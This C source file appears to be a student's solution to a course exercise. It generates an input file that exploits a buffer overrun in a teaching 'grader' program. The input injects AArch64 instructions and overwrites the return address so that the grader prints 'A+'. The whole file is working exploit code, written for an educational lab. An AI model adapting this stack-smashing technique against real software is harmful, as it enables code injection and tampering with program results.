/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K                                                    */
/*--------------------------------------------------------------------*/

/*
  Produces a file called "dataAplus" that, when provided as input to the
  grader program, causes the grader to output a grade of "A+" associated 
  with the given user name. This is achieved by exploiting a buffer 
  overrun vulnerability to inject instructions that modify the 'grade' 
  variable in memory and cause the program to print "A+".
*/

/*
  Interactive behavior of main:
  - main does not accept command-line arguments.
  - main does not read from stdin or any other input stream.
  - main does not write to stdout or stderr.
  - main writes a crafted sequence of bytes to a file named "dataAplus".
  - main returns 0 upon successful completion.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* Constants representing lengths and addresses derived from analysis. */
enum {
    NAME_LENGTH = 9,         /* Length of "AnishKKat" without null */
    NULL_TERM_COUNT = 1,     /* One null terminator after the name */
    PADDING_COUNT = 10,      /* Number of '0' chars to overflow stack */
    ALIGN_COUNT = 3,         /* Number of null bytes for alignment */
    A_CHAR_ADDR = 0x42006c,  /* Address in bss where 'A' will be located */
    START_INSTR_ADDR = 0x420070, /* Address where injected instructions begin */
    PRINTF_ADDR = 0x400690,  /* Address of printf function */
    GRADE_ADDR = 0x420044,   /* Address of 'grade' variable in data */
    BRANCH_BACK_ADDR = 0x40089c, /* Address in main to branch back to */
    BL_INSTR_SHIFT = 2,
    BL_INSTR_MASK = 0x03FFFFFF
};

/* 
   Generates a BL (branch with link) instruction to call a function
   at ulTargetAddr from the instruction at ulCurrentAddr.
   The offset is computed and inserted into the base BL opcode.
*/
static unsigned int GenerateBL(unsigned long ulTargetAddr, unsigned long ulCurrentAddr) {
    unsigned int uiInstr = 0x94000000;
    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> BL_INSTR_SHIFT);
    uiInstr |= (uiOffset & BL_INSTR_MASK);
    return uiInstr;
}

int main(void) {
    /* The name that will be written into the name array in bss. */
    const char *pcName = "AnishKKat";
    
    int iCount;
    unsigned long ulNewReturnAddress;
    unsigned int uiMovInstr;
    unsigned int uiAdrInstr;
    unsigned int uiStrbInstr;
    unsigned int uiBranchInstr;

    /* 
       Open "dataAplus" for writing. This file will contain:
       1. The chosen name plus a null terminator.
       2. Padding to overflow the stack and overwrite the return address.
       3. The character 'A' plus alignment bytes.
       4. Injected instructions that:
          - Load 'A' address and call printf (so 'A' is printed).
          - Overwrite 'D' with '+' in the grade variable.
          - Branch back to main, causing the modified grade "A+" to be printed.
    */
    FILE *pOutputFile = fopen("dataAplus", "w");
    if (!pOutputFile) return 1;

    /* Write the chosen name followed by a null terminator to the file. */
    fwrite(pcName, 1, NAME_LENGTH, pOutputFile);
    fputc('\0', pOutputFile);

    /* Write '0' characters to overflow the stack. */
    iCount = 0;
    while (iCount < PADDING_COUNT) {
        fputc('0', pOutputFile);
        iCount++;
    }

    /* Write the 'A' character that will be printed, followed by alignment bytes. */
    fputc('A', pOutputFile);
    for (iCount = 0; iCount < ALIGN_COUNT; iCount++) {
        fputc('\0', pOutputFile);
    }

    /* Insert an ADR instruction to load the address of 'A' into x0. */
    uiMovInstr = MiniAssembler_adr(0, A_CHAR_ADDR, START_INSTR_ADDR);
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Insert a BL instruction to call printf at PRINTF_ADDR. */
    uiBranchInstr = GenerateBL(PRINTF_ADDR, START_INSTR_ADDR + 4);
    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Insert a MOV instruction to move '+' into w0. */
    uiMovInstr = MiniAssembler_mov(0, '+');
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Insert an ADR instruction to put the grade variable's address into x1. */
    uiAdrInstr = MiniAssembler_adr(1, GRADE_ADDR, START_INSTR_ADDR + 12);
    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Insert a STRB instruction to store '+' in place of 'D' at the grade address. */
    uiStrbInstr = MiniAssembler_strb(0, 1);
    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Insert a B instruction to branch back to main's printing sequence. */
    uiBranchInstr = MiniAssembler_b(BRANCH_BACK_ADDR, START_INSTR_ADDR + 20);
    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pOutputFile);

    /* Overwrite the stored return address so execution jumps into our instructions. */
    ulNewReturnAddress = START_INSTR_ADDR;
    fwrite(&ulNewReturnAddress, sizeof(unsigned long), 1, pOutputFile);

    fclose(pOutputFile);

    return 0;
}